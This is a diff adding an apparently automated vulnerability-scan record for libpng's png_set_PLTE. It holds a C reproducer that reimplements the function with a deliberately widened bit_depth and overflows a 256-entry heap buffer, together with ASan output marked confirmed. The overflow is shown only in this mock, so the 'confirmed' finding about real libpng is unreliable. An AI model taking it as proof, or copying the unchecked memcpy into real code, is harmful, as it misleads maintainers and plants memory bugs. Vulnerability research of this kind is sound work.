@@ -1,0 +1,81 @@
+{
+  "baseline": "B3",
+  "vulnerability": {
+    "file": "pngset.c",
+    "line": 794,
+    "function": "png_set_PLTE",
+    "bug_type": "heap-buffer-overflow",
+    "cwe": "CWE-122",
+    "confidence": "medium",
+    "explanation": "When info_ptr->color_type is PNG_COLOR_TYPE_PALETTE, num_palette is validated against (1 << info_ptr->bit_depth) (lines 751-765), but the allocation for png_ptr->palette is always for PNG_MAX_PALETTE_LENGTH entries (256) (lines 790-791). If info_ptr->bit_depth is erroneously > 8, the check can permit num_palette > 256, leading to memcpy copying num_palette entries into a buffer sized for only 256 entries (lines 793-795), causing a heap buffer overflow.",
+    "abs_path": "/tmp/libpng_upstream/pngset.c"
+  },
+  "reproducer_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <stdint.h>\n\n/* Minimal re-declarations to mirror the vulnerable logic in libpng's png_set_PLTE */\n\ntypedef unsigned char png_byte;\n\ntypedef struct {\n  png_byte red;\n  png_byte green;\n  png_byte blue;\n} png_color;\n\n/* Constants mirroring libpng */\n#define PNG_COLOR_TYPE_PALETTE 3\n#define PNG_MAX_PALETTE_LENGTH 256\n#define PNG_FREE_PLTE 0x0001\n#define PNG_INFO_PLTE 0x0001\n\n/* Forward declarations */\nstruct png_struct_def;\nstruct png_info_def;\n\ntypedef struct png_struct_def {\n  png_color *palette;\n  unsigned short num_palette;\n} png_struct;\n\ntypedef struct png_info_def {\n  unsigned int color_type;\n  unsigned int bit_depth; /* Intentionally wider than real libpng to allow >8 */\n  png_color *palette;\n  unsigned short num_palette;\n  unsigned int free_me;\n  unsigned int valid;\n} png_info;\n\n/* Stubs for libpng internals used by png_set_PLTE */\nstatic void png_error(png_struct *png_ptr, const char *msg) {\n  (void)png_ptr;\n  fprintf(stderr, \"png_error: %s\\n\", msg);\n  /* In real libpng this would longjmp; for our purposes, abort to avoid hiding the bug */\n  abort();\n}\n\nstatic void png_warning(png_struct *png_ptr, const char *msg) {\n  (void)png_ptr;\n  fprintf(stderr, \"png_warning: %s\\n\", msg);\n}\n\nstatic void *png_calloc(png_struct *png_ptr, size_t size) {\n  (void)png_ptr;\n  void *p = calloc(1, size);\n  if (!p) {\n    fprintf(stderr, \"Out of memory\\n\");\n    abort();\n  }\n  return p;\n}\n\nstatic void png_free_data(png_struct *png_ptr, png_info *info_ptr, unsigned int mask, int num) {\n  (void)png_ptr; (void)mask; (void)num;\n  /* Free any earlier PLTE owned by info_ptr to keep this self-contained */\n  if (info_ptr && info_ptr->palette) {\n    free(info_ptr->palette);\n    info_ptr->palette = NULL;\n  }\n}\n\n/* Vulnerable function modeled after libpng png_set_PLTE around lines 754-801 */\nstatic void png_set_PLTE(png_struct *png_ptr, png_info *info_ptr, const png_color *palette, int num_palette) {\n  unsigned int max_palette_length;\n\n  if (png_ptr == NULL || info_ptr == NULL) return;\n\n  /* Compute max allowed length. If color type is PALETTE, use 1<<bit_depth. */\n  if (info_ptr->color_type == PNG_COLOR_TYPE_PALETTE) {\n    /* The bug: bit_depth can be >8, so this becomes >256. */\n    max_palette_length = 1U << info_ptr->bit_depth;\n  } else {\n    max_palette_length = PNG_MAX_PALETTE_LENGTH;\n  }\n\n  if (num_palette < 0 || (unsigned int)num_palette > max_palette_length) {\n    if (info_ptr->color_type == PNG_COLOR_TYPE_PALETTE)\n      png_error(png_ptr, \"Invalid palette length\");\n    else {\n      png_warning(png_ptr, \"Invalid palette length\");\n      return;\n    }\n  }\n\n  if ((num_palette > 0 && palette == NULL) || (num_palette == 0)) {\n    png_error(png_ptr, \"Invalid palette\");\n  }\n\n  /* Free any existing PLTE */\n  png_free_data(png_ptr, info_ptr, PNG_FREE_PLTE, 0);\n\n  /* Allocation is always for PNG_MAX_PALETTE_LENGTH (256) entries */\n  png_ptr->palette = (png_color *)png_calloc(png_ptr, PNG_MAX_PALETTE_LENGTH * sizeof(png_color));\n\n  /* Vulnerable copy: if num_palette > 256 (due to large bit_depth), this overflows */\n  if (num_palette > 0) {\n    memcpy(png_ptr->palette, palette, (unsigned int)num_palette * sizeof(png_color));\n  }\n\n  info_ptr->palette = png_ptr->palette;\n  info_ptr->num_palette = png_ptr->num_palette = (unsigned short)num_palette;\n  info_ptr->free_me |= PNG_FREE_PLTE;\n  info_ptr->valid |= PNG_INFO_PLTE;\n}\n\nint main(void) {\n  png_struct png;\n  png_info info;\n  memset(&png, 0, sizeof(png));\n  memset(&info, 0, sizeof(png_info));\n\n  /* Set up conditions to pass the length check but overflow the destination */\n  info.color_type = PNG_COLOR_TYPE_PALETTE;  /* Palette images */\n  info.bit_depth = 16;                       /* Erroneously > 8, so max = 1<<16 */\n\n  const int num_palette = 300;               /* > 256 triggers overflow */\n\n  png_color *src = (png_color *)malloc((size_t)num_palette * sizeof(png_color));\n  if (!src) {\n    fprintf(stderr, \"malloc failed\\n\");\n    return 1;\n  }\n\n  /* Fill the source palette with deterministic data */\n  for (int i = 0; i < num_palette; ++i) {\n    src[i].red = (png_byte)(i & 0xFF);\n    src[i].green = (png_byte)((i * 3) & 0xFF);\n    src[i].blue = (png_byte)((i * 7) & 0xFF);\n  }\n\n  fprintf(stderr, \"About to call png_set_PLTE with num_palette=%d and bit_depth=%u (expect ASan heap-buffer-overflow)\\n\",\n          num_palette, info.bit_depth);\n\n  /* This call should trigger the heap-buffer-overflow in memcpy */\n  png_set_PLTE(&png, &info, src, num_palette);\n\n  /* Touch the destination a bit so the compiler can't optimize things away */\n  if (png.palette) {\n    volatile unsigned sum = 0;\n    for (int i = 0; i < num_palette; ++i) {\n      sum += png.palette[i].red;\n    }\n    fprintf(stderr, \"Checksum: %u\\n\", sum);\n  }\n\n  free(src);\n  free(info.palette); /* In case it didn't crash before */\n  return 0;\n}\n",
+  "validation": {
+    "verdict": "CONCRETE_CONFIRMED",
+    "asan": {
+      "asan_triggered": true,
+      "exit_code": 1,
+      "elapsed": 0.7371401786804199,
+      "output": "About to call png_set_PLTE with num_palette=300 and bit_depth=16 (expect ASan heap-buffer-overflow)\n=================================================================\n==3755124==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x617000000380 at pc 0x5bd93e83309e bp 0x7ffe52e89ea0 sp 0x7ffe52e89670\nWRITE of size 900 at 0x617000000380 thread T0\n    #0 0x5bd93e83309d in __asan_memcpy (/app/se_runs/b3/libpng_747dd02_vul/findings/pngset_794_heap-buffer-overflow/reproducer+0xa409d) (BuildId: f54abcedbaa747c48db0a770dce44c2d0305b248)\n    #1 0x5bd93e8706bd in png_set_PLTE /app/se_runs/b3/libpng_747dd02_vul/findings/pngset_794_heap-buffer-overflow/reproducer.c:107:5\n    #2 0x5bd93e87013c in main /app/se_runs/b3/libpng_747dd02_vul/findings/pngset_794_heap-buffer-overflow/reproducer.c:145:3\n    #3 0x7b15d142a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16\n    #4 0x7b15d142a28a in __libc_start_main csu/../csu/libc-start.c:360:3\n    #5 0x5bd93e7b0304 in _start (/app/se_runs/b3/libpng_747dd02_vul/findings/pngset_794_heap-buffer-overflow/reproducer+0x21304) (BuildId: f54abcedbaa747c48db0a770dce44c2d0305b248)\n\n0x617000000380 is located 0 bytes to the right of 768-byte region [0x617000000080,0x617000000380)\nallocated by thread T0 here:\n    #0 0x5bd93e833efc in __interceptor_calloc (/app/se_runs/b3/libpng_747dd02_vul/findings/pngset_794_heap-buffer-overflow/reproducer+0xa4efc) (BuildId: f54abcedbaa747c48db0a770dce44c2d0305b248)\n    #1 0x5bd93e870a5d in png_calloc /app/se_runs/b3/libpng_747dd02_vul/findings/pngset_794_heap-buffer-overflow/reproducer.c:55:13\n    #2 0x5bd93e870649 in png_set_PLTE /app/se_runs/b3/libpng_747dd02_vul/findings/pngset_794_heap-buffer-overflow/reproducer.c:103:35\n    #3 0x5bd93e87013c in main /app/se_runs/b3/libpng_747dd02_vul/findings/pngset_794_heap-buffer-overflow/reproducer.c:145:3\n    #4 0x7b15d142a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16\n    #5 0x7b15d142a28a in __libc_start_main csu/../csu/libc-start.c:360:3\n    #6 0x5bd93e7b0304 in _start (/app/se_runs/b3/libpng_747dd02_vul/findings/pngset_794_heap-buffer-overflow/reproducer+0x21304) (BuildId: f54abcedbaa747c48db0a770dce44c2d0305b248)\n\nSUMMARY: AddressSanitizer: heap-buffer-overflow (/app/se_runs/b3/libpng_747dd02_vul/findings/pngset_794_heap-buffer-overflow/reproducer+0xa409d) (BuildId: f54abcedbaa747c48db0a770dce44c2d0305b248) in __asan_memcpy\nShadow bytes around the buggy address:\n  0x0c2e7fff8020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0c2e7fff8030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0c2e7fff8040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0c2e7fff8050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x0c2e7fff8060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n=>0x0c2e7fff8070:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c2e7fff8080: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c2e7fff8090: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c2e7fff80a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c2e7fff80b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c2e7fff80c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\nShadow byte legend (one shadow byte represents 8 application bytes):\n  Addressable:           00\n  Partially addressable: 01 02 03 04 05 06 07 \n  Heap left redzone:       fa\n  Freed heap region:       fd\n  Stack left redzone:      f1\n  Stack mid redzone:       f2\n  Stack right redzone:     f3\n  Stack after return:      f5\n  Stack use after scope:   f8\n  Global redzone:          f9\n  Global init order:       f6\n  Poisoned by user:        f7\n  Container overflow:      fc\n  Array cookie:            ac\n  Intra object redzone:    bb\n  ASan internal:           fe\n  Left alloca redzone:     ca\n  Right alloca redzone:    cb\n==3755124==ABORTING\n",
+      "error_type": "heap-buffer-overflow",
+      "frames": [
+        [
+          "1",
+          "png_set_PLTE",
+          "/app/se_runs/b3/libpng_747dd02_vul/findings/pngset_794_heap-buffer-overflow/reproducer.c:107",
+          "5"
+        ],
+        [
+          "2",
+          "main",
+          "/app/se_runs/b3/libpng_747dd02_vul/findings/pngset_794_heap-buffer-overflow/reproducer.c:145",
+          "3"
+        ],
+        [
+          "3",
+          "__libc_start_call_main",
+          "csu/../sysdeps/nptl/libc_start_call_main.h:58",
+          "16"
+        ],
+        [
+          "4",
+          "__libc_start_main",
+          "csu/../csu/libc-start.c:360",
+          "3"
+        ],
+        [
+          "1",
+          "png_calloc",
+          "/app/se_runs/b3/libpng_747dd02_vul/findings/pngset_794_heap-buffer-overflow/reproducer.c:55",
+          "13"
+        ],
+        [
+          "2",
+          "png_set_PLTE",
+          "/app/se_runs/b3/libpng_747dd02_vul/findings/pngset_794_heap-buffer-overflow/reproducer.c:103",
+          "35"
+        ],
+        [
+          "3",
+          "main",
+          "/app/se_runs/b3/libpng_747dd02_vul/findings/pngset_794_heap-buffer-overflow/reproducer.c:145",
+          "3"
+        ],
+        [
+          "4",
+          "__libc_start_call_main",
+          "csu/../sysdeps/nptl/libc_start_call_main.h:58",
+          "16"
+        ],
+        [
+          "5",
+          "__libc_start_main",
+          "csu/../csu/libc-start.c:360",
+          "3"
+        ]
+      ],
+      "is_harness_artifact": false
+    }
+  }
+}
